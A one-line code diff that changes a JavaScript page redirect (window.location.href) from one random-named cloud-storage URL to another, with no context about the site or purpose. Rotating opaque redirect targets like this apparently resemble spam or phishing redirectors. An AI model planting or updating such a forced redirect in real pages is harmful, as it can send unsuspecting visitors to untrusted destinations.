@@ -1,1 +1,1 @@
-window.location.href="http://xianzhe8.tos-cn-guangzhou.volces.com/t-y?code=iPzq8NuHnFr&FAc"
+window.location.href="http://yx4ipfpp.oss-cn-beijing.aliyuncs.com/pXHB4EI"
